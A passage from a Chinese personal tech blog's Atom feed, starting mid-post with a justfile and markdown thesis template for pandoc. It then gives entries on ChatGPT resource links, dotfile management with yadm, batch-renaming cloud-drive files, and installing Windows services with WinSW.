re.compile(r&#x27;[^\u4e00-\u9fa5a-zA-Z0-9\s]&#x27;)<br>        punctuation_chars = pattern.findall(text)<br>        punctuation_count = len(punctuation_chars)<br>        <span class="hljs-comment"># 统计英文单词数量</span><br>        words = re.findall(r&#x27;\b[A-Za-z]+\b&#x27;, text)<br>        word_count = len(words)<br>        <span class="hljs-comment"># 输出统计结果</span><br>        print(<span class="hljs-string">&quot;汉字数量:&quot;</span>, chinese_count)<br>        print(<span class="hljs-string">&quot;英文字母数量:&quot;</span>, english_count)<br>        print(<span class="hljs-string">&quot;标点符号数量:&quot;</span>, punctuation_count)<br>        print(<span class="hljs-string">&quot;英文单词数量:&quot;</span>, word_count)<br>        print(<span class="hljs-string">&quot;汉字+字母+标点:&quot;</span>, chinese_count+english_count+punctuation_count)<br><span class="hljs-section">final:</span><br>    pandoc.exe -t plain -i 论文.md -o 1.txt<br>    pandoc.exe -t plain -i path/to/论文.docx -o count.txt<br>    sed -i &#x27;s/。/。\n/g&#x27; 1.txt <span class="hljs-comment"># 以句号为界断行</span><br>    sed -i &#x27;s/。/。\n/g&#x27; count.txt<br>    echo &#x27;最后的论文懒得往 `论文.md` 里更新了，把最后的 word 转换出的 txt diff 一下放这里吧&#x27; &gt; diff.md<br>    echo -e <span class="hljs-string">&quot;\n\`\`\`diff\n$(diff --color -u 1.txt count.txt)\n\`\`\`&quot;</span> &gt;&gt; diff.md<br>    mdfmt -w diff.md<br>    sed -i &#x27;s/^ //g&#x27; diff.md<br>    <span class="hljs-comment">#mdcat README.md</span><br>    rm 1.txt<br>    just cc<br>    @mv count.txt new.txt<br></code></pre></td></tr></table></figure><h3 id="markdown-模板">markdown 模板</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-section">###### 标题</span><br><br><span class="hljs-section"># 摘要</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section">###### Title</span><br><br><span class="hljs-section"># Abstract</span><br><br>I can eat glass, it does not hurt me<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br>&lt;!-- 占位用，转成 docx 后在此处添加目录：引用 → 目录 → 自动目录1 --&gt;<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 一、绪论</span><br><br><span class="hljs-section">## 1.1 项目背景</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">## 1.2 行业现状</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">## 1.3 要解决的问题</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 二、相关技术简介</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 三、需求分析与设计</span><br><br><span class="hljs-section">## 3.1 可行性分析</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">### 3.1.1 技术可行性</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">### 3.1.2 操作可行性</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">### 3.1.3 经济可行性</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">## 3.2 任务概述</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">## 3.3 需求分析</span><br><br><span class="hljs-section">### 3.3.1 AA 需求</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section">### 3.3.2 BB 需求</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 五、实现</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 六、测试</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 七、总结与展望</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-section"># 致谢</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 参考文献</span><br><br>我能吞下玻璃而不伤身体<br><br><span class="hljs-code">```&#123;=openxml&#125;</span><br><span class="hljs-code">&lt;w:p&gt;</span><br><span class="hljs-code">  &lt;w:r&gt;</span><br><span class="hljs-code">    &lt;w:br w:type=&quot;page&quot;/&gt;</span><br><span class="hljs-code">  &lt;/w:r&gt;</span><br><span class="hljs-code">&lt;/w:p&gt;</span><br><span class="hljs-code">```</span><br><br><span class="hljs-section"># 附录</span><br><br>我能吞下玻璃而不伤身体<br></code></pre></td></tr></table></figure><section class="footnotes"><h2>参考</h2><div class="footnote-list"><ol><li><span id="fn:1"class="footnote-text"><span><a href="https://just.systems/man/zh/">Just用户指南</a> <a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><ahref="https://gitee.com/waleslau/papper-format-helpper">papper-format-helpper</a><a href="#fnref:2" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;经过了历时几个月的论文写作，我的毕业设计的论文部分总算完成了，在此记录一下写论文时使用到的方法。&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;第一阶段，查资料、写论文。这个阶段我使用纯 markdown
+编写论文内容并使用 git 做版本管理，不涉及</summary>
+      
+    
+    
+    
+    
+    <category term="markdown" scheme="https://blog.oopsky.top/tags/markdown/"/>
+    
+    <category term="git" scheme="https://blog.oopsky.top/tags/git/"/>
+    
+    <category term="pandoc" scheme="https://blog.oopsky.top/tags/pandoc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>ChatGPT 相关资源收集整理</title>
+    <link href="https://blog.oopsky.top/post/21e870c9/"/>
+    <id>https://blog.oopsky.top/post/21e870c9/</id>
+    <published>2023-04-10T03:22:00.000Z</published>
+    <updated>2024-11-18T04:20:56.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="网址">网址</h2><ul><li>墙裂推荐 <a href="https://poe.com">poe.com</a> 💥！网络通畅的话收藏这一个就够了</li><li>DuckDuckGo 也提供了类似 poe的服务，无需登录，当然也不会保存你的使用记录，挺好用的。有两个入口，<ahref="https://duckduckgo.com/?q=DuckDuckGo&amp;ia=chat">DuckDuckGo AIChat</a> 或者 <a href="https://duck.ai/"class="uri">https://duck.ai/</a></li></ul><p>还有一些国内公司的大模型，做的也挺不错了。</p><ul><li>阿里通义千问 <a href="https://tongyi.aliyun.com/"class="uri">https://tongyi.aliyun.com/</a></li><li>字节豆包 <a href="https://www.doubao.com/chat/"class="uri">https://www.doubao.com/chat/</a></li><li>百度文心一言 <a href="https://yiyan.baidu.com/"class="uri">https://yiyan.baidu.com/</a></li><li>讯飞星火 <a href="https://xinghuo.xfyun.cn/"class="uri">https://xinghuo.xfyun.cn/</a></li><li>月之暗面 kimi <a href="https://kimi.moonshot.cn/"class="uri">https://kimi.moonshot.cn/</a></li><li>腾讯元宝 <a href="https://yuanbao.tencent.com/chat/"class="uri">https://yuanbao.tencent.com/chat/</a></li><li>… …</li></ul><h2 id="提示词指南">提示词指南</h2><ul><li><a href="https://www.zhihu.com/question/570430650">你用 ChatGPT生成过哪些有趣的回答</a>：知乎网友各显神通。</li><li><a href="https://www.aishort.top/">ChatGPTShortcut</a>：让生产力加倍的 ChatGPT 快捷指令</li><li><a href="https://www.explainthis.io/zh-hans/chatgpt">ChatGPT指令大全</a>：提供精炼过的指令语句。</li><li><ahref="https://github.com/PlexPt/awesome-chatgpt-prompts-zh">ChatGPT中文调教指南</a>：各种场景使用指南。学习怎么让它听你的话。</li><li><a href="https://github.com/yzfly/wonderful-prompts">中文 prompt精选</a>：提升 ChatGPT 可玩性和可用性！</li></ul><h2 id="其他">其他</h2><ul><li><a href="https://lzw.me/x/chatgpt-sites/">国内可用的 ChatGPT在线体验免费网站列表导航</a></li><li><a href="https://www.anthropic.com/index/claude-now-in-slack">Claudein Slack</a></li><li><a href="https://www.phind.com/">phind</a></li><li><a href="https://www.editgpt.app/">editGPT</a></li><li><a href="https://github.com/lvwzhen/law-cn-ai">AI 法律助手</a></li><li><ahref="https://github.com/supabase-community/nextjs-openai-doc-search">ChatGPTstyle doc search</a></li><li><a href="https://github.com/gorse-io/midsearch">一个基于 ChatGPT的文档搜索引擎</a></li><li><a href="https://chatexcel.com">酷表 CHATExcel</a></li><li><a href="https://aicolors.co/">AI Colors</a></li><li><a href="https://regex.ai/">AI 驱动的正则表达式求解器</a></li><li><ahref="https://github.com/Bin-Huang/chatbox/releases">ChatBox</a></li><li><ahref="https://github.com/Yidadaa/ChatGPT-Next-Web/blob/main/README_CN.md">ChatGPT-Next-Web</a></li></ul>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;网址&quot;&gt;网址&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;墙裂推荐 &lt;a href=&quot;https://poe.com&quot;&gt;poe.com&lt;/a&gt; 💥
+！网络通畅的话收藏这一个就够了&lt;/li&gt;
+&lt;li&gt;DuckDuckGo 也提供了类似 poe
+的服务，无需登录，当然也不会保存你的</summary>
+      
+    
+    
+    
+    
+    <category term="chatgpt" scheme="https://blog.oopsky.top/tags/chatgpt/"/>
+    
+    <category term="ai" scheme="https://blog.oopsky.top/tags/ai/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>管理 Linux 用户配置（点文件）的最好方式</title>
+    <link href="https://blog.oopsky.top/post/5fa4b291/"/>
+    <id>https://blog.oopsky.top/post/5fa4b291/</id>
+    <published>2023-02-06T06:22:00.000Z</published>
+    <updated>2023-09-24T02:44:37.000Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="前言">前言</h2><p>标题有点违反广告法了哈哈哈，言归正传，作为一个 LinuxUser，随着时间的推移，我积攒了一大堆自定义的配置文件。有时某些软件会在我不知道的时候自动修改这些文件，这会对我造成一些困扰，而且每次重装系统或在其他设备初始化工作环境时都要一个一个地拷贝它们，这太不优雅了！我得想个办法解决这些问题。经过搜索，我找到了以下几种方式：</p><ol type="1"><li><ahref="https://farseerfc.me/zhs/using-gnu-stow-to-manage-your-dotfiles.html">【译】使用GNU stow 管理你的点文件</a></li><li><a href="https://www.atlassian.com/git/tutorials/dotfiles">How toStore Dotfiles - A Bare Git Repository</a></li><li><a href="https://github.com/twpayne/chezmoi">chezmoi: Manage yourdotfiles across multiple diverse machines, securely.</a></li></ol><p>经过试用/对比，我最终选用了第二个链接内提到的方法，即使用 Bare GitRepository 方式管理。得益于 Git的强大功能，这种方式主要可以做到以下功能：</p><ul><li>版本管理</li><li>监测配置更改</li><li>多设备同步</li></ul><p>这是<a href="https://github.com/waleslau/dotfiles">我的 dotfiles仓库</a>，这种方法的所有功能都是通过 git 实现的，只需要往<code>.bashrc</code>里写入一个命令别名。由于下面有更好的方法，此处不再赘述，感兴趣的话可以看一下我仓库里的<ahref="https://github.com/waleslau/dotfiles/blob/main/README.md">README.md</a>。</p><p>后来我又发现了一个工具：<ahref="https://github.com/TheLocehiliosan/yadm">yadm</a>，这个工具也是基于Bare Git Repository设计的，比我原来的方法多了一些挺实用的功能（比如敏感文件加密存储，这个功能其实git 本身就可以通过<ahref="https://git-secret.io/">插件</a>支持，但没有直接使用<code>yadm</code>方便就是了），由于底层原理相同，我原来的方法建立的仓库和本工具是完全兼容的，把配置同步到远端仓库后直接<code>yadm clone &lt;repo url&gt;</code> 然后<code>yadm checkout $HOME</code> 就可以无痛切换到新工具了，开森 🥰</p><h2 id="安装">安装</h2><p>大多数发行版都可以直接使用包管理工具安装<code>yadm</code>，如果发行版仓库里没有，也可以直接从 Github仓库下载（这个东西本质上其实就是一个 shell 脚本）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mkdir</span> -p ~/.local/bin<br>curl https://fastly.jsdelivr.net/gh/TheLocehiliosan/yadm@master/yadm -o ~/.local/bin/yadm<br><span class="hljs-built_in">chmod</span> +x ~/.local/bin/yadm<br></code></pre></td></tr></table></figure><h2 id="使用">使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 初始化一个新仓库</span><br>yadm init<br><br><span class="hljs-comment"># 克隆现有仓库</span><br>yadm <span class="hljs-built_in">clone</span> &lt;url&gt;<br><br><span class="hljs-comment"># 增添文件/应用更改</span><br>yadm add &lt;important file&gt;<br>yadm commit<br><br><span class="hljs-comment"># 加密存储 ssh 密钥，以安全地同步它</span><br><span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;.ssh/id_rsa&#x27;</span> &gt; ~/.config/yadm/encrypt<br>yadm encrypt<br><br><span class="hljs-comment"># 可以在同步本仓库到其他设备后，解密ssh密钥</span><br>yadm decrypt<br><br><span class="hljs-comment"># 为Linux与MacOS创建不同的文件</span><br>yadm add path/file.cfg##os.Linux<br>yadm add path/file.cfg##os.Darwin<br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
+&lt;p&gt;标题有点违反广告法了哈哈哈，言归正传，作为一个 Linux
+User，随着时间的推移，我积攒了一大堆自定义的配置文件。有时某些软件会在我不知道的时候自动修改这些文件，这会对我造成一些困扰，而且每次重装系统或在其他设备初始化工作环境时都</summary>
+      
+    
+    
+    
+    
+    <category term="linux" scheme="https://blog.oopsky.top/tags/linux/"/>
+    
+    <category term="dotfiles" scheme="https://blog.oopsky.top/tags/dotfiles/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>批量重命名阿里云盘里的文件</title>
+    <link href="https://blog.oopsky.top/post/2440b999/"/>
+    <id>https://blog.oopsky.top/post/2440b999/</id>
+    <published>2023-01-10T23:12:47.000Z</published>
+    <updated>2023-01-10T23:39:29.000Z</updated>
+    
+    <content type="html"><![CDATA[<ol type="1"><li>运行 <ahref="https://github.com/messense/aliyundrive-webdav">aliyundrive-webdav</a></li><li>挂载到本地<ul><li>Windows ：文件管理器 → 此电脑 → 右键 → 添加一个网络位置</li></ul></li><li>现在可以使用各种批量重命名工具<ul><li>Windows：可以用 <ahref="https://github.com/microsoft/PowerToys">PowerToys</a> 里的PowerRename</li><li>Linux：可以写脚本遍历目录，通过 <code>rename</code> 或<code>mv</code>、<code>sed</code> 等命令行工具实现批量重命名</li></ul></li></ol>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;ol type=&quot;1&quot;&gt;
+&lt;li&gt;运行 &lt;a
+href=&quot;https://github.com/messense/aliyundrive-webdav&quot;&gt;aliyundrive-webdav&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;挂载到本地
+&lt;ul&gt;
+&lt;li&gt;Windows ：文件管理器 </summary>
+      
+    
+    
+    
+    
+    <category term="aliyundrive" scheme="https://blog.oopsky.top/tags/aliyundrive/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 WinSW 把可执行文件安装为服务</title>
+    <link href="https://blog.oopsky.top/post/376ebc48/"/>
+    <id>https://blog.oopsky.top/post/376ebc48/</id>
+    <published>2023-01-05T00:06:00.000Z</published>
+    <updated>2024-10-13T12:57:30.000Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p><ahref="https://github.com/winsw/winsw">https://github.com/winsw/winsw</a></p></blockquote><h2 id="参数列表">参数列表</h2><table><thead><tr class="header"><th>Command</th><th>Description</th></tr></thead><tbody><tr class="odd"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#install-command">install</a></td><td>Installs the service.</td></tr><tr class="even"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#uninstall-command">uninstall</a></td><td>Uninstalls the service.</td></tr><tr class="odd"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#start-command">start</a></td><td>Starts the service.</td></tr><tr class="even"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#stop-command">stop</a></td><td>Stops the service.</td></tr><tr class="odd"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#restart-command">restart</a></td><td>Stops and then starts the service.</td></tr><tr class="even"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#status-command">status</a></td><td>Checks the status of the service.</td></tr><tr class="odd"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#refresh-command">refresh</a></td><td>Refreshes the service properties without reinstallation.</td></tr><tr class="even"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#customize-command">customize</a></td><td>Customizes the wrapper executable.</td></tr><tr class="odd"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#dev-ps-command">devps</a></td><td>Draws the process tree associated with the service.</td></tr><tr class="even"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#dev-kill-command">devkill</a></td><td>Terminates the service if it has stopped responding.</td></tr><tr class="odd"><td><ahref="https://github.com/winsw/winsw/tree/v3/docs/cli-commands.md#dev-list-command">devlist</a></td><td>Lists services managed by the current executable.</td></tr></tbody></table><h2 id="使用方式">使用方式</h2><p>先说结论</p><ul><li><p>若 <code>WinSW.exe</code> 和 <code>myapp.xml</code>不在同一目录</p><ul><li>使用 <code>WinSW.exe install .\myapp.xml</code> 操作服务</li></ul></li><li><p>若 <code>WinSW.exe</code> 和 <code>myapp.xml</code>在同一目录</p><ul><li>可以使用 <code>WinSW.exe install .\myapp.xml</code> 操作服务</li><li>也可以把 <code>WinSW.exe</code> 重命名为<code>myapp.exe</code>，然后使用 <code>myapp install</code>操作服务</li></ul></li></ul><p>服务示例：<br /><code>chfs-service.xml</code>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">service</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">id</span>&gt;</span>chfs-service<span class="hljs-tag">&lt;/<span class="hljs-name">id</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>CUTE HTTP FILE SERVER<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span> http://iscute.cn/chfs <span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">executable</span>&gt;</span> chfs.exe <span class="hljs-tag">&lt;/<span class="hljs-name">executable</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">arguments</span>&gt;</span> --rule=&quot;::r|root:123456:rwd&quot; --path=&quot;D:\\&quot; <span class="hljs-tag">&lt;/<span class="hljs-name">arguments</span>&gt;</span><br>  <span class="hljs-comment">&lt;!-- 把日志文件都放到xml所在位置的子目录 --&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">logpath</span>&gt;</span>%BASE%\logs<span class="hljs-tag">&lt;/<span class="hljs-name">logpath</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">log</span> <span class="hljs-attr">mode</span>=<span class="hljs-string">&quot;roll&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">service</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="全局方式">全局方式</h3><ol type="1"><li>从 <a href="https://github.com/winsw/winsw/releases">发布页面</a>下载 <code>WinSW.exe</code></li><li>创建一个专门用来放 xml 文件的目录，把 <code>WinSW.exe</code>放入其中，创建 <code>myapp1.xml</code>、<code>myapp2.xml</code> …</li><li>然后可以使用形似下面的命令操作每个服务</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">WinSW.exe install .\myapp1.xml<br>WinSW.exe install .\myapp2.xml<br></code></pre></td></tr></table></figure><blockquote><p>也可以随便找个其他地方，把 <code>WinSW.exe</code> 放入其中，并加入<code>PATH</code>，总之能访问到 WinSW.exe 就行</p></blockquote><h3 id="捆绑方式">捆绑方式</h3><ol type="1"><li>下载 <code>WinSW.exe</code></li><li>创建一个文件夹，把 <code>WinSW.exe</code> 放入其中并重命名为<code>myapp.exe</code></li><li>在相同文件夹内创建 <code>myapp.xml</code></li><li>然后可以使用形似下面的命令操作服务</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">myapp install<br>myapp start<br>myapp stop<br>myapp uninstall<br></code></pre></td></tr></table></figure><p>目录结构：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs yml"><span class="hljs-string">├──</span> <span class="hljs-string">chfs-service.exe</span><br><span class="hljs-string">└──</span> <span class="hljs-string">chfs-service.xml</span><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;&lt;a
+href=&quot;https://github.com/winsw/winsw&quot;&gt;https://github.com/winsw/winsw&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&quot;参数列表&quot;&gt;参数列表&lt;/h2&gt;
+&lt;table</summary>
+      
+    
+    
+    
+    
+    <category term="windows" scheme="https://blog.oopsky.top/tags/windows/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>使用 frp 把内网服务暴露到公网</title>
+    <link href="https://blog.oopsky.top/post/16f5231f/"/>
+    <id>https://blog.oopsky.top/post/16f5231f/</id>
+    <published>2022-12-20T05:13:39.000Z</published>
+    <updated>2022-12-20T05:59:41.000Z</updated>
+    
